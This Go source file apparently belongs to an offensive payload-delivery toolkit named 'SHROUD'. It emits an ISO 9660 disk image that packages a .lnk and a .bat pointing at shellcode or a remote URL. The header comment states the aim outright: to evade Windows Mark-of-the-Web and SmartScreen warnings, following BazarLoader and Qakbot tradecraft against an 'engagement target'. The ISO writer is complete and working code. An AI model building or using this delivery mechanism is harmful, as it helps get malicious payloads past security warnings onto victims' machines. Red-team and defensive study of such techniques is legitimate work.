// iso.go — emit a .iso disk image (ISO 9660, no Joliet/Rock Ridge) that
// packages a .lnk + a .bat pointing at the same shellcode/url. The inner
// artifacts are built by delegating to the lnk and bat emitters (comboInner),
// then packed into a minimal single-session ISO 9660 image written in pure Go.
//
// Why ISO: mounting an ISO on Windows does NOT propagate Mark-of-the-Web (MOTW)
// to the extracted files, so a .lnk/.bat inside a mounted ISO runs without the
// "downloaded from the internet" SmartScreen friction — a current (2022+)
// delivery primitive (BazarLoader/Qakbot used ISO+LNK for exactly this).
// Double-click the mounted ISO's PAYLOAD.LNK, or run PAYLOAD.BAT.
//
// The writer follows the ECMA-119 PVD/directory-record/path-table byte layout
// (cross-checked against github.com/diskfs/go-diskfs, which produces
// Windows-mountable images). It is minimal: 8.3 uppercase names + ;1 version,
// single root directory, no interleaving, no SUSP. The test suite parses the
// generated image back in-Go; 7z structural verification is run out-of-band.
// Windows on-target mount + execution is the final verification step. If a
// generated .iso does not mount on the engagement target, fall back to -f zip
// (same .lnk + .bat, no MOTW bypass).
package delivery

import (
	"encoding/binary"
	"fmt"
	"path/filepath"
	"strings"
)

type isoEmitter struct{}

func (isoEmitter) Name() string { return "iso" }
func (isoEmitter) Ext() string  { return "iso" }

func (isoEmitter) Emit(s *Spec) ([]Artifact, error) {
	if len(s.Shellcode) == 0 && !s.Remote() {
		return nil, errPayloadRequired("iso")
	}
	inner, err := comboInner(s)
	if err != nil {
		return nil, err
	}
	var files []isoFile
	for _, a := range inner {
		files = append(files, isoFile{name: isoName(a.Path), data: a.Bytes})
	}
	img, err := buildISO(files)
	if err != nil {
		return nil, err
	}
	return []Artifact{writeFile("payload.iso", img)}, nil
}

// --- ISO 9660 writer -------------------------------------------------------

const (
	isoSectorSize = 2048
	isoPvdLBA     = 16 // Primary Volume Descriptor
	isoTermLBA    = 17 // Volume Descriptor Set Terminator
	isoLPathLBA   = 18 // Type L (little-endian) path table
	isoMPathLBA   = 19 // Type M (big-endian) path table
	isoRootLBA    = 20 // root directory extent
)

type isoFile struct {
	name string // ISO 9660 identifier, e.g. "PAYLOAD.LNK;1"
	data []byte
}

type isoEntry struct {
	lba  uint32
	size uint32
	name string
	data []byte
}

// buildISO lays out a minimal single-session ISO 9660 image:
//
//	sectors 0-15  system area (zero)
//	sector  16    Primary Volume Descriptor
//	sector  17    Volume Descriptor Set Terminator
//	sector  18    Type L path table
//	sector  19    Type M path table
//	sector  20    root directory extent (1 sector)
//	sector  21+   file extents (each sector-aligned)
func buildISO(files []isoFile) ([]byte, error) {
	if len(files) == 0 {
		return nil, fmt.Errorf("iso: no files to package")
	}

	// Place file extents sequentially from sector 21.
	var entries []isoEntry
	lba := uint32(isoRootLBA + 1)
	for _, f := range files {
		n := uint32(len(f.data))
		entries = append(entries, isoEntry{lba: lba, size: n, name: f.name, data: f.data})
		lba += isoSectorsFor(n)
	}
	volumeSpaceSize := lba // total sectors (0-based last LBA + 1)

	rootDirSize := uint32(isoSectorSize) // root extent occupies one full sector
	pathTableSize := uint32(len(isoPathTable(true, isoRootLBA)))

	img := make([]byte, int64(volumeSpaceSize)*isoSectorSize)

	copy(img[isoPvdLBA*isoSectorSize:], isoPVD(volumeSpaceSize, pathTableSize, isoLPathLBA, isoMPathLBA, isoRootLBA, rootDirSize))

	term := img[isoTermLBA*isoSectorSize : (isoTermLBA+1)*isoSectorSize]
	term[0] = 0xFF
	copy(term[1:6], []byte("CD001"))
	term[6] = 0x01

	copy(img[isoLPathLBA*isoSectorSize:], isoPathTable(true, isoRootLBA))
	copy(img[isoMPathLBA*isoSectorSize:], isoPathTable(false, isoRootLBA))

	copy(img[isoRootLBA*isoSectorSize:], isoRootDir(isoRootLBA, rootDirSize, entries))

	for _, e := range entries {
		copy(img[int64(e.lba)*isoSectorSize:], e.data)
	}

	return img, nil
}

// isoSectorsFor returns the number of 2048-byte sectors needed to hold n bytes
// (a 0-byte file occupies 0 sectors; our files are non-empty so >=1).
func isoSectorsFor(n uint32) uint32 {
	if n == 0 {
		return 0
	}
	return (n + isoSectorSize - 1) / isoSectorSize
}

// isoPVD builds the 2048-byte Primary Volume Descriptor. Field offsets are
// 0-based and follow ECMA-119 (cross-checked against go-diskfs toBytes):
//
//	0     type 0x01 | 1-5 "CD001" | 6 version 0x01 | 7 0x00
//	8-39  system identifier (32)        40-71 volume identifier (32)
//	80-87 volume space size (LE+BE)    88-119 unused
//	120-123 volume set size (LE+BE u16) 124-127 volume sequence (LE+BE u16)
//	128-131 logical block size (LE+BE u16) 132-139 path table size (LE+BE u32)
//	140-143 L path table LBA (LE)       144-147 optional L (LE, 0)
//	148-151 M path table LBA (BE)       152-155 optional M (BE, 0)
//	156-189 root directory record (34)  190-317 volume set id (128)
//	318-445 publisher (128)            446-573 preparer (128)
//	574-701 application (128)           702-738 copyright file (37)
//	739-775 abstract file (37)         776-812 bibliographic file (37)
//	813-829/830-846/847-863/864-880 creation/mod/expiry/effective date (17 each)
//	881 file structure version 0x01    882 0x00
func isoPVD(volumeSpaceSize, pathTableSize, lPathLBA, mPathLBA, rootLBA, rootSize uint32) []byte {
	b := make([]byte, isoSectorSize)
	b[0] = 0x01
	copy(b[1:6], []byte("CD001"))
	b[6] = 0x01

	copy(b[8:40], isoPadField("", 32))
	copy(b[40:72], isoPadField("SHROUD", 32))

	binaryPut32(b, 80, volumeSpaceSize) // LE@80, BE@84
	binaryPut16(b, 120, 1)              // volume set size
	binaryPut16(b, 124, 1)              // volume sequence number
	binaryPut16(b, 128, isoSectorSize)  // logical block size
	binaryPut32(b, 132, pathTableSize)  // path table size
	binary.LittleEndian.PutUint32(b[140:144], lPathLBA)
	// b[144:148] optional L path table = 0
	binary.BigEndian.PutUint32(b[148:152], mPathLBA)
	// b[152:156] optional M path table = 0

	copy(b[156:156+34], isoDirRecord([]byte{0x00}, rootLBA, rootSize, true))

	copy(b[190:190+128], isoPadField("", 128))       // volume set id
	copy(b[318:318+128], isoPadField("", 128))       // publisher
	copy(b[446:446+128], isoPadField("SHROUD", 128)) // preparer
	copy(b[574:574+128], isoPadField("", 128))       // application
	// 702-812: copyright/abstract/bibliographic file identifiers = 0

	cre := isoDate17Fixed()
	copy(b[813:813+17], cre)
	copy(b[830:830+17], cre)
	copy(b[847:847+17], cre)
	copy(b[864:864+17], cre)

	b[881] = 0x01
	return b
}

// isoPathTable builds the path table for a single-root image: one record for
// the root directory (name 0x00, parent index 1). Type L uses little-endian
// integers, type M big-endian. The record is 10 bytes (8 + 1 name + 1 pad).
func isoPathTable(le bool, rootLBA uint32) []byte {
	rec := make([]byte, 10)
	rec[0] = 1 // directory identifier length
	// rec[1] = 0 extended attribute record length
	if le {
		binary.LittleEndian.PutUint32(rec[2:6], rootLBA)
		binary.LittleEndian.PutUint16(rec[6:8], 1) // parent: root's own (1-based)
	} else {
		binary.BigEndian.PutUint32(rec[2:6], rootLBA)
		binary.BigEndian.PutUint16(rec[6:8], 1)
	}
	rec[8] = 0x00 // root directory identifier
	rec[9] = 0x00 // padding (name length is odd)
	return rec
}

// isoRootDir builds the root directory extent (one 2048-byte sector): the "."
// and ".." self/parent entries followed by one record per packaged file, with
// the remainder zero-padded. Directory records must not cross a sector
// boundary; our records are small and fit in one sector, so no splitting.
func isoRootDir(rootLBA, rootSize uint32, entries []isoEntry) []byte {
	buf := make([]byte, isoSectorSize)
	off := 0
	dot := isoDirRecord([]byte{0x00}, rootLBA, rootSize, true)
	dotdot := isoDirRecord([]byte{0x01}, rootLBA, rootSize, true) // root's parent is itself
	off += copy(buf[off:], dot)
	off += copy(buf[off:], dotdot)
	for _, e := range entries {
		r := isoDirRecord([]byte(e.name), e.lba, e.size, false)
		off += copy(buf[off:], r)
	}
	return buf
}

// isoDirRecord builds one ISO 9660 directory record (0-based offsets):
//
//	0  length (set last) | 1 ext attr len 0 | 2-9 extent LBA (LE+BE)
//	10-17 data size (LE+BE) | 18-24 recording date (7) | 25 flags
//	26 file unit size 0 | 27 interleave gap 0 | 28-31 volume sequence (LE+BE u16)
//	32 file identifier length | 33.. identifier | pad to even
func isoDirRecord(name []byte, lba, size uint32, isDir bool) []byte {
	namelen := uint8(len(name))
	rec := make([]byte, 33+namelen)
	binary.LittleEndian.PutUint32(rec[2:6], lba)
	binary.BigEndian.PutUint32(rec[6:10], lba)
	binary.LittleEndian.PutUint32(rec[10:14], size)
	binary.BigEndian.PutUint32(rec[14:18], size)
	copy(rec[18:25], isoRecDateFixed()) // 7 bytes
	if isDir {
		rec[25] = 0x02
	}
	binary.LittleEndian.PutUint16(rec[28:30], 1)
	binary.BigEndian.PutUint16(rec[30:32], 1)
	rec[32] = namelen
	copy(rec[33:], name)
	if len(rec)%2 != 0 {
		rec = append(rec, 0x00)
	}
	rec[0] = uint8(len(rec))
	return rec
}

// isoName converts a basename like "payload.lnk" to an ISO 9660 file identifier
// "PAYLOAD.LNK;1": uppercase, 8.3 preserved as-is, with the ;1 version suffix.
// Names with no extension become "NAME;1". Callers ensure 8.3-clean basenames.
func isoName(path string) string {
	return strings.ToUpper(filepath.Base(path)) + ";1"
}

// isoPadField returns s space-padded (or truncated) to exactly width bytes,
// matching the a/d-character space-padding the spec requires for identifier
// fields. An empty s yields all spaces (not zeros).
func isoPadField(s string, width int) []byte {
	if len(s) > width {
		s = s[:width]
	}
	b := make([]byte, width)
	for i := range b {
		b[i] = ' '
	}
	copy(b, s)
	return b
}

// isoDate17Fixed returns a fixed 17-byte volume date/time (2026-01-01
// 00:00:00 GMT) for reproducible builds: "YYYYMMDDHHMMSS" (14) + hundredths
// "00" (2) + GMT offset 0x00 = 17 bytes.
func isoDate17Fixed() []byte {
	return append([]byte("2026010100000000"), 0x00)
}

// isoRecDateFixed returns the 7-byte directory-record recording date for the
// same fixed instant: year-since-1900 (126), month 1, day 1, hour/min/sec 0,
// GMT 0.
func isoRecDateFixed() []byte {
	return []byte{126, 1, 1, 0, 0, 0, 0}
}

// binaryPut16 writes a 16-bit value in both byte orders (LE at off, BE at
// off+2). binaryPut32 does the same for 32-bit (LE at off, BE at off+4).
func binaryPut16(b []byte, off int, v uint16) {
	binary.LittleEndian.PutUint16(b[off:off+2], v)
	binary.BigEndian.PutUint16(b[off+2:off+4], v)
}

func binaryPut32(b []byte, off int, v uint32) {
	binary.LittleEndian.PutUint32(b[off:off+4], v)
	binary.BigEndian.PutUint32(b[off+4:off+8], v)
}
